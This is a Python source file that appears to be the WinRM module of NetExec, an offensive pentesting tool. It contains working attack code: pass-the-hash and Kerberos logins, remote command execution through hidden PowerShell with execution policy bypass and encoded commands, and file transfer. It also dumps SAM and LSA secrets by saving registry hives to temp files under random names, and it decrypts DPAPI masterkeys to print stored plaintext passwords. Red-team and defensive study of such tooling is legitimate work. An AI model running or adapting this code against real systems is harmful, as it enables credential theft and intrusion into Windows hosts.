import os
import base64
import traceback
import requests
import urllib3
import ntpath
from termcolor import colored
import xml.etree.ElementTree as ET

from dploot.lib.utils import is_guid, is_credfile
from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
from impacket.uuid import bin_to_string

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.logger import highlight
from nxc.helpers.misc import gen_random_string
from nxc.helpers.negotiate_parser import parse_challenge
from nxc.logger import NXCAdapter
from nxc.paths import TMP_PATH

from impacket.winrm import (
    BasicTransport,
    ClientCertificateTransport,
    CredSSPTransport,
    KerberosTransport,
    NegotiateTransport,
    NTCredential,
    WinRSClient,
    WinRMAuthError,
    WinRMFaultError,
    WinRMTransportError,
    get_kerberos_credential,
    _build_envelope
)
from impacket.krb5.kerberosv5 import SessionError


urllib3.disable_warnings()

WSMAN_ENUMERATE_ACTION = (
    "http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate"
)

WSMAN_SHELL_RESOURCE_URI = (
    "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
)

WSEN_NAMESPACE = (
    "http://schemas.xmlsoap.org/ws/2004/09/enumeration"
)

WSMAN_NAMESPACE = (
    "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
)

def _parse_hashes(hashes):
    if not hashes:
        return "", ""

    if ":" in hashes:
        lmhash, nthash = hashes.split(":", 1)
        return lmhash, nthash

    return "", hashes


def _build_command(command, shell_type):
    if shell_type == "powershell":
        command = f'$ProgressPreference="SilentlyContinue ";{command}'
        encoded = base64.b64encode(command.encode("utf-16le")).decode("ascii")
        return "powershell.exe", ["-NoP", "-NoL", "-sta", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Enc", encoded] 
    return "cmd.exe", ["/Q", "/c", command]


def _build_winrm_admin_check_request(timeout=20, session_id=None):
    envelope, header, body = _build_envelope(
        "create",
        resource_uri=WSMAN_SHELL_RESOURCE_URI,
        timeout=timeout,
        session_id=session_id,
    )

    action = header.find("{http://schemas.xmlsoap.org/ws/2004/08/addressing}Action")

    if action is None:
        raise WinRMTransportError("Unable to find WS-Man Action header")
    action.text = WSMAN_ENUMERATE_ACTION
    enumerate_msg = ET.SubElement(body, f"{{{WSEN_NAMESPACE}}}Enumerate")
    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}OptimizeEnumeration")
    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}MaxElements", ).text = "32000"

    return envelope


class _KerberosFallbackTransport:
    """Kerberos transport which retries through Negotiate when GSS fails."""

    def __init__(self, url, credentials, timeout):
        self._url = url
        self._credentials = credentials
        self._timeout = timeout
        self._transport = KerberosTransport(url, credentials, timeout=timeout)
        self._fallback_attempted = False

    def send(self, request):
        try:
            return self._transport.send(request)
        except WinRMAuthError:
            if self._fallback_attempted:
                raise

            self._fallback_attempted = True
            self._transport.close()
            self._transport = NegotiateTransport(
                self._url, self._credentials, timeout=self._timeout
            )
            return self._transport.send(request)

    def close(self):
        self._transport.close()


class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = ""
        self.server_os = None
        self.endpoint = None
        self.lmhash = ""
        self.nthash = ""
        self.ssl = False
        self.challenge_header = None
        self.targetDomain = None
        self.no_ntlm = False
        self._transport = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": "5985",
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        try:
            ntlm_info = parse_challenge(base64.b64decode(self.challenge_header.split(" ")[1].replace(",", "")))
        except Exception as e:
            self.logger.debug(f"Error parsing NTLM challenge: {e!s}")
            self.logger.debug(f"Raw challenge: {self.challenge_header.split(' ')[1].replace(',', '')[:20]}...")
            self.logger.error("Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently")
            self.no_ntlm = True
            return False

        self.targetDomain = self.domain = ntlm_info["domain"]
        self.hostname = ntlm_info["hostname"]
        self.server_os = ntlm_info["os_version"]
        self.logger.extra["hostname"] = self.hostname

        try:
            self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
        except Exception as e:
            self.logger.debug(f"Error adding host to database: {e!s}")

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

    def print_host_info(self):
        self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
        self.logger.extra["port"] = self.port
        ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain}) {ntlm}")

    def create_conn_obj(self):
        if self.is_link_local_ipv6:
            self.logger.fail("winrm not support link-local ipv6, exiting...")
            return False

        endpoints = {}

        headers = {
            "Content-Length": "0",
            "Keep-Alive": "true",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
            "Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
        }

        for protocol in self.args.check_proto:
            endpoints[protocol] = {}
            endpoints[protocol]["port"] = self.port[self.args.check_proto.index(protocol)] if len(self.port) == 2 else self.port[0]
            endpoints[protocol]["url"] = f"{protocol}://{self.host if not self.is_ipv6 else f'[{self.host}]'}:{endpoints[protocol]['port']}/wsman"
            endpoints[protocol]["ssl"] = (protocol != "http")

        for protocol in endpoints:
            self.port = endpoints[protocol]["port"]
            try:
                self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
                res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                self.logger.debug(f"Received response code: {res.status_code}")
                self.challenge_header = res.headers.get("WWW-Authenticate")
                if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
                    self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
                    return False
                self.endpoint = endpoints[protocol]["url"]
                self.ssl = endpoints[protocol]["ssl"]
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False

    def check_if_admin(self):
        self.admin_privs = False

        if self.conn is None:
            self.logger.debug("WinRM session is not established")
            return False

        try:
            request = _build_winrm_admin_check_request(timeout=self.conn.timeout, session_id=self.conn.session_id,)
            self.conn._send(request)
            self.admin_privs = True

        except WinRMFaultError as e:
            self.logger.debug(f"WinRM administrator check failed: {e!s}")

        except Exception as e:
            self.logger.debug(f"Error checking administrator privileges: {e!s}")

        return self.admin_privs

    def _winrm_url(self):
        if self.endpoint:
            return self.endpoint

        scheme = "https" if self.ssl else "http"
        host = self.host if not self.is_ipv6 else f"[{self.host}]"
        return f"{scheme}://{host}:{self.port}/wsman"

    def _close_winrs(self):
        if self.conn is not None:
            try:
                close = getattr(self.conn, "close", None)
                if close:
                    close()
            except Exception:
                pass
            self.conn = None

        if self._transport is not None:
            try:
                self._transport.close()
            except Exception:
                pass
            self._transport = None

    def _connect_winrs(self, username, password=None, hashes=None):
        self._close_winrs()

        timeout = getattr(self.args, "http_timeout", 1) or 1
        url = self._winrm_url()
        lmhash, nthash = _parse_hashes(hashes or "")

        use_kerberos = bool(
            getattr(self, "kerberos", False)
            or getattr(self.args, "kerberos", False)
            or getattr(self.args, "k", False)
        )
        use_basic = bool(getattr(self.args, "basic", False))
        use_credssp = bool(getattr(self.args, "credssp", False))

        cert_pem = getattr(self.args, "cert_pem", "") or ""
        cert_key = getattr(self.args, "cert_key", "") or ""

        if cert_pem or cert_key:
            if not cert_pem or not cert_key:
                raise WinRMTransportError("Client certificate authentication requires both -cert-pem and -cert-key")

            if not self.ssl:
                raise WinRMTransportError("Client certificate authentication requires HTTPS")

            transport = ClientCertificateTransport(url, cert_pem, cert_key, timeout=timeout)

        elif use_basic:
            if not username or password is None or password == "":
                raise WinRMTransportError("Basic authentication requires a username and password")

            transport = BasicTransport(url, username, password, timeout=timeout)

        elif use_kerberos:
            target_hostname = self.hostname or self.host
            if not target_hostname:
                raise WinRMTransportError("Unable to determine the target hostname for Kerberos")

            spn = f"HTTP/{target_hostname}"

            aes_key = (
                getattr(self, "aesKey", None)
                or getattr(self.args, "aesKey", "")
                or getattr(self.args, "aes_key", "")
            )

            if isinstance(aes_key, (list, tuple)):
                aes_key = aes_key[0] if aes_key else ""

            kdc_host = (
                getattr(self.args, "dc_ip", None)
                or getattr(self, "kdcHost", None)
            )

            try:
                kerberos_credentials = get_kerberos_credential(
                    spn,
                    domain=self.domain,
                    username=username,
                    password=password or "",
                    lmhash=lmhash,
                    nthash=nthash,
                    aes_key=aes_key,
                    kdc_host=kdc_host,
                    use_cache=True,
                )
            except SessionError as e:
                error = str(e)
                if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in error:
                    raise WinRMTransportError("KDC_ERR_S_PRINCIPAL_UNKNOWN: unable to find Kerberos service principal")
                raise WinRMTransportError(error) from e

            if use_credssp:
                if not kerberos_credentials.password:
                    raise WinRMTransportError("CredSSP needs a plaintext password, even when using Kerberos")

                transport = CredSSPTransport(url, kerberos_credentials, timeout=timeout)
            else:
                transport = _KerberosFallbackTransport(url, kerberos_credentials, timeout=timeout)

        else:
            credentials = NTCredential(
                domain=self.domain or "",
                username=username or "",
                password=password or "",
                lmhash=bytes.fromhex(lmhash) if lmhash else "",
                nthash=bytes.fromhex(nthash) if nthash else "",
            )

            if use_credssp:
                if not credentials.username or not credentials.password:
                    raise WinRMTransportError("CredSSP needs a username and plaintext password")

                transport = CredSSPTransport(url, credentials, timeout=timeout)
            else:
                transport = NegotiateTransport(url, credentials, timeout=timeout)

        self._transport = transport
        self.conn = WinRSClient(self._transport, timeout=self.args.http_timeout)
        return self.conn

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.domain = domain
        self.username = username
        self.password = password or ""

        try:
            self.kdcHost = kdcHost or self.kdcHost
            if aesKey:
                self.aesKey = aesKey

            self._connect_winrs(username, password=password, hashes=ntlm_hash)

            self.check_if_admin()
            secret = aesKey or ntlm_hash or password
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(secret)} {self.mark_pwned()}"
            )

            cred_type = "hash" if ntlm_hash or aesKey else "plaintext"

            self.db.add_credential(cred_type, domain, self.username, secret)
            user_id = self.db.get_credential(cred_type, domain, self.username, secret)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user(cred_type, domain, self.username, secret, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if self.username:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            secret = aesKey or ntlm_hash or password
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(secret)} {e!s}")
            self._close_winrs()
            return False

    def plaintext_login(self, domain, username, password):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.password = password
        self.username = username
        self.domain = domain

        try:
            self._connect_winrs(username, password=password)

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}: {process_secret(self.password)} {e!s}")
            self._close_winrs()
            return False

    def hash_login(self, domain, username, ntlm_hash):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.username = username
        self.domain = domain
        self.lmhash, self.nthash = _parse_hashes(ntlm_hash)

        try:
            self._connect_winrs(username, hashes=ntlm_hash)

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")

            self.db.add_credential("hash", domain, self.username, ntlm_hash)
            user_id = self.db.get_credential("hash", domain, self.username, ntlm_hash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}: {process_secret(self.nthash)} {e!s}")
            self._close_winrs()
            return False

    def disconnect(self):
        self._close_winrs()

    def execute(self, payload=None, get_output=False, shell_type="cmd"):
        if not payload:
            payload = self.args.execute

        if self.conn is None:
            self.logger.fail("WinRM session is not established")
            return None

        command, arguments = _build_command(payload, shell_type)
        codec = getattr(self.args, "codec", None) or "utf-8"

        try:
            remote_command = self.conn.execute(command, arguments=arguments)

            output = remote_command.iter_output()

            stdout = []
            stderr = []
            interrupted = False

            while True:
                try:
                    stream_name, data = next(output)
                except StopIteration:
                    break
                except KeyboardInterrupt:
                    if interrupted:
                        raise
                    interrupted = True
                    self.logger.info("Sending Ctrl+C to the remote command")
                    remote_command.interrupt()
                    continue

                if not data:
                    continue

                try:
                    text = data.decode(codec)
                except UnicodeDecodeError:
                    self.logger.debug("Decoding error detected, retrying with replacement characters")
                    text = data.decode(codec, errors="replace")

                if stream_name == "stderr":
                    stderr.append(text)
                else:
                    stdout.append(text)

            stdout_text = "".join(stdout)
            stderr_text = "".join(stderr)

            if get_output:
                return stdout_text

            if not getattr(self.args, "no_output", False):
                for line in stdout_text.replace("\r", "").splitlines():
                    self.logger.highlight(line.rstrip())

                for line in stderr_text.replace("\r", "").splitlines():
                    self.logger.fail(line.rstrip())

            if stderr_text:
                self.logger.fail("Command execution failed")

            return stdout_text

        except (WinRMAuthError, WinRMFaultError, WinRMTransportError) as e:
            if getattr(e, "code", None) == 5:
                self.logger.fail(f"Execute command failed, current user: {self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
            else:
                self.logger.fail(f"Execute command failed, error: {e!s}")
            return None

        except Exception as e:
            self.logger.debug(traceback.format_exc())
            self.logger.fail(f"Execute command failed, error: {e!s}")
            return None

    def ps_execute(self, payload=None, get_output=False):
        command = payload if payload else self.args.ps_execute
        return self.execute(payload=command, get_output=get_output, shell_type="powershell")

    def get_file(self, remote_path=None, download_path=None):
        remote_path = remote_path if remote_path else self.args.get_file[0]
        local_path = download_path if download_path else self.args.get_file[1]

        if local_path.endswith("/"):
            local_path += ntpath.basename(remote_path)

        try:
            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')

            escaped = remote_path.replace("'", "''")
            data = self.ps_execute(f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped}'))", True)

            if not data:
                raise RuntimeError("Remote file returned no data")

            with open(local_path, "wb") as fp:
                fp.write(base64.b64decode("".join(data.split())))

            self.logger.success(f"File {remote_path} has been saved to {local_path}")
            return True

        except Exception as e:
            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
            return False

    def put_file(self, local_path=None, remote_path=None):
        local_path = local_path if local_path else self.args.put_file[0]
        remote_path = remote_path if remote_path else self.args.put_file[1]
        remote_path += (
            os.path.basename(local_path)
            if remote_path.endswith(("\\", "/"))
            else ""
        )

        try:
            self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')

            with open(local_path, "rb") as fp:
                encoded = base64.b64encode(fp.read()).decode("ascii")

            escaped = remote_path.replace("'", "''")
            command = f"$b=[Convert]::FromBase64String('{encoded}'); [IO.File]::WriteAllBytes('{escaped}',$b)"

            self.ps_execute(command)

            self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
            return True

        except Exception as e:
            self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")
            return False

    def dir(self, directory=None):
        directory = directory if directory else self.args.dir
        out = self.execute(f"dir {directory}", True)
        if out is not None:
            for line in out.splitlines():
                self.logger.highlight(line.rstrip())

    def sam(self):
        sam_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="sam")

        try:
            output = self.execute(dump_command, get_output=True)

            if output is None:
                raise RuntimeError("Failed to execute SAM dump command")

            if not self.get_file(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam"):
                raise RuntimeError("Failed to download SAM hive")

            if not self.get_file(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system"):
                raise RuntimeError("Failed to download SYSTEM hive")

            self.execute(clean_command, get_output=True)

        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
            return

        self.logger.display("Dumping SAM hashes")

        local_operations = LocalOperations(f"{output_filename}.system")
        boot_key = local_operations.getBootKey()
        SAM = SAMHashes(f"{output_filename}.sam", boot_key, isRemote=None, perSecretCallback=lambda secret: self.logger.highlight(secret))
        SAM.dump()
        SAM.export(output_filename)

    def lsa(self):
        security_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="lsa")

        try:
            output = self.execute(dump_command, get_output=True)

            if output is None:
                raise RuntimeError("Failed to execute LSA dump command")

            if not self.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security"):
                raise RuntimeError("Failed to download SECURITY hive")

            if not self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system"):
                raise RuntimeError("Failed to download SYSTEM hive")

            self.execute(clean_command, get_output=True)

        except Exception as e:
            print(e)
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
            return

        self.logger.display("Dumping LSA secrets")

        local_operations = LocalOperations(f"{output_filename}.system")
        boot_key = local_operations.getBootKey()
        LSA = LSASecrets(
            f"{output_filename}.security",
            boot_key,
            None,
            isRemote=None,
            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
        )
        LSA.dumpCachedHashes()
        LSA.dumpSecrets()

    def dpapi(self):
        user_masterkey_path = ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Protect")
        user_credentials_paths = [
            ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Credentials"),
            ntpath.join("C:\\Users", self.username, "AppData\\Local\\Microsoft\\Credentials")
        ]

        self.logger.display("Collecting DPAPI masterkeys...")

        sids = self.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
        if not sids:
            self.logger.fail(f"No masterkeys found for user {self.username}")
            return

        masterkeys = []
        for sid in sids.splitlines():
            keys_path = ntpath.join(user_masterkey_path, sid.strip())
            keys = self.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)

            for key in keys.splitlines():
                stripped_key = key.strip()
                if is_guid(stripped_key):
                    key_path = ntpath.join(keys_path, stripped_key)
                    self.logger.debug(f"Found masterkey file {key_path}")

                    local_key_file = f"{TMP_PATH}/{stripped_key}"

                    if not self.get_file(key_path, local_key_file):
                        continue

                    decrypted_key = self.get_master_key(local_key_file, sid, self.password)

                    if decrypted_key:
                        masterkeys.append((stripped_key, decrypted_key))

        if not masterkeys:
            self.logger.fail("Could not decrypt any keys")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")

        credential_files = []

        for user_credentials_path in user_credentials_paths:
            creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)

            for cred_file in creds.splitlines():
                stripped_cred_file = cred_file.strip()

                if is_credfile(stripped_cred_file):
                    creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
                    self.logger.debug(f"Found credentials file {creds_path}")

                    local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"

                    if self.get_file(creds_path, local_cred_file):
                        credential_files.append(local_cred_file)

        if not credential_files:
            self.logger.fail(f"No credential files found for user {self.username}")
            return

        for creds_file in credential_files:
            with open(creds_file, "rb") as fp:
                data = fp.read()

            cred = CredentialFile(data)
            blob = DPAPI_BLOB(cred["Data"])

            guid_masterkey = bin_to_string(blob["GuidMasterKey"])
            right_key = next((key for guid, key in masterkeys if guid.lower() == guid_masterkey.lower()), None)

            if right_key is not None:
                try:
                    decrypted = blob.decrypt(right_key)

                    if decrypted is not None:
                        self.logger.debug(f"Successfully decrypted credentials in {creds_file}:")
                        creds = CREDENTIAL_BLOB(decrypted)

                        if creds["Unknown3"] != b"":
                            target = creds["Target"].decode("utf-16le")
                            username = creds["Username"].decode("utf-16le")

                            try:
                                password = creds["Unknown3"].decode("utf-16le")
                            except UnicodeDecodeError:
                                password = creds["Unknown3"].decode("latin-1")

                            self.logger.highlight(f"{target} - {username}:{password}")

                except Exception as e:
                    self.logger.fail(f"Failed to decrypt credentials in {creds_file} with masterkey: {e!s}")
                    self.logger.debug(traceback.format_exc())

            else:
                self.logger.fail(f"No matching masterkey found for credentials in {creds_file} (need {guid_masterkey})")

    def get_master_key(self, masterkey_file, sid, password):
        with open(masterkey_file, "rb") as fp:
            data = fp.read()

        mkf = MasterKeyFile(data)
        data = data[len(mkf):]

        mk = None
        bkmk = None

        if mkf["MasterKeyLen"] > 0:
            mk = MasterKey(data[:mkf["MasterKeyLen"]])
            data = data[len(mk):]

        if mkf["BackupKeyLen"] > 0:
            bkmk = MasterKey(data[:mkf["BackupKeyLen"]])
            data = data[len(bkmk):]

        if mkf["CredHistLen"] > 0:
            ch = CredHist(data[:mkf["CredHistLen"]])
            data = data[len(ch):]

        if mkf["DomainKeyLen"] > 0:
            dk = DomainKey(data[:mkf["DomainKeyLen"]])
            data = data[len(dk):]

        key1, key2, key3 = deriveKeysFromUser(sid, password)

        if mk:
            decryptedKey = mk.decrypt(key3)
            if decryptedKey:
                self.logger.debug("Decrypted key with User Key (MD4 protected)")
                return decryptedKey

            decryptedKey = mk.decrypt(key2)
            if decryptedKey:
                self.logger.debug("Decrypted key with User Key (MD4)")
                return decryptedKey

            decryptedKey = mk.decrypt(key1)
            if decryptedKey:
                self.logger.debug("Decrypted key with User Key (SHA1)")
                return decryptedKey

        if bkmk:
            decryptedKey = bkmk.decrypt(key3)
            if decryptedKey:
                self.logger.debug("Decrypted Backup key with User Key (MD4 protected)")
                return decryptedKey

            decryptedKey = bkmk.decrypt(key2)
            if decryptedKey:
                self.logger.debug("Decrypted Backup key with User Key (MD4)")
                return decryptedKey

            decryptedKey = bkmk.decrypt(key1)
            if decryptedKey:
                self.logger.debug("Decrypted Backup key with User Key (SHA1)")
                return decryptedKey

        return None
